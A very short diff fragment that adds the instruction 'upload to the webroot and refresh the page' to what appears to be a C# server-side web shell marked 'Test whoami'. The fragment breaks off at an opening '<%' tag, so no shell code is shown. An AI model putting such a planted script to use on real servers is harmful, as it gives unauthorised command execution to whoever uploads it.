@@ -1,4 +1,5 @@
 #below code is using C#
+#upload to the webroot and refresh the page
 
 #Test whoami
 <%
